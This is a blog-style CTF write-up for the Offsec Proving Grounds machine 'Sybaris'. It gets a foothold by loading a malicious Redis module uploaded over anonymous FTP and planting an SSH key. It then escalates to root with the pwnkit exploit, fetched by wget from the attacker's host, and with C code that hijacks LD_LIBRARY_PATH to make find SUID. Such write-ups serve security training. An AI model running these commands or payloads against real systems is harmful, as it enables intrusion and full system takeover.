---
title: "Proving grounds Practice: Sybaris"
layout: post
date: 2024-06-20 02:00
tag: 
- CTF
- Offsec labs
- OSCP
- Writeup
- Linux
- PG-Practice
- 
writeups: true
hidden: true
author: Naveen
description: "Offsec proving grounds practice linux machine writeup"
---

## Nmap
```shell
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.2
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/7.3.22)
6379/tcp open  redis   Redis key-value store 5.0.9
```

## 21/tcp   open  ftp     vsftpd 3.0.2
Anonymous login success
No directory found

## 80/tcp   open  http Apache httpd 2.4.6 ((CentOS) PHP/7.3.22)
Nothing here...

## 6379/tcp open  redis   Redis key-value store 5.0.9
Upload module.so file to the remote machine through the FTP.
Use redis-cli to import the uploaded module for command execution

```shell
naveenj@hackerspace:[21:42]~/proving_grounds/Sybaris$ redis-cli -h 192.168.209.93
192.168.209.93:6379> MODULE LOAD /var/ftp/pub/exp.so
OK
192.168.209.93:6379> system.exe "id"
(error) ERR unknown command `system.exe`, with args beginning with: `id`, 
192.168.209.93:6379> module list
1) 1) "name"
   2) "system"
   3) "ver"
   4) (integer) 1
192.168.209.93:6379> system.exec "whoami;id;hostname;uname -a"
"pablo\nuid=1000(pablo) gid=1000(pablo) groups=1000(pablo)\nsybaris\nLinux sybaris 3.10.0-1127.19.1.el7.x86_64 #1 SMP Tue Aug 25 17:23:54 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux\n"
```

- Now copy id_rsa.pub file from the local machine to remote machine via ftp.

- Run the copy command to copy /var/ftp/pub/authorized_keys to /home/pablo/.ssh/authorized_keys. Ensure the .ssh folder was created before copying the key.

- Cross check the file using the redis-cli system.exec command and ssh to the user.

## Privilege Escalation

Sudo version vulnerable to [CVE-2021-4034](https://github.com/joeammond/CVE-2021-4034) (pwnkit).

```shell
[pablo@sybaris tmp]$ wget http://192.168.45.174/CVE-2021-4034.py -O exploit.py
--2023-10-29 22:01:50--  http://192.168.45.174/CVE-2021-4034.py
Connecting to 192.168.45.174:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3262 (3.2K) [text/x-python]
Saving to: ‘exploit.py’

100%[===================================================================================================================================================>] 3,262       --.-K/s   in 0.003s  

2023-10-29 22:01:51 (1.09 MB/s) - ‘exploit.py’ saved [3262/3262]

[pablo@sybaris tmp]$ which python
/usr/bin/python
[pablo@sybaris tmp]$ python exploit.py 
[+] Creating shared library for exploit code.
[+] Calling execve()
[root@sybaris tmp]# cd /root
[root@sybaris root]#
```

## Alternative

```shell
[pablo@sybaris ~]$ cat /etc/crontab 
SHELL=/bin/bash
PATH=/sbin:/bin:/usr/sbin:/usr/bin
LD_LIBRARY_PATH=/usr/lib:/usr/lib64:/usr/local/lib/dev:/usr/local/lib/utils
MAILTO=""

# For details see man 4 crontabs

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name  command to be executed
  *  *  *  *  * root       /usr/bin/log-sweeper
```

Abuse LD_LIBRARY_PATH

https://atom.hackstreetboys.ph/linux-privilege-escalation-environment-variables/

Exploit

```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("chmod u+s /usr/bin/find");
}
```

### Compile the exploit and run

`gcc -o utils.so -shared -fPIC exploit.c`

```shell
[pablo@sybaris tmp]$ ls -al /usr/bin/find
-rwsr-sr-x. 1 root root 199304 Oct 30  2018 /usr/bin/find   #SUID bit set
[pablo@sybaris tmp]$
[pablo@sybaris tmp]$ /usr/bin/find . -exec /bin/sh -p \; -quit
```

Note after running the exploit the `SUID` bit has been set to the binry `find`.

**Root Obtained**

For more insights and updates, follow me on Twitter: [@thevillagehacker](https://twitter.com/thevillagehackr).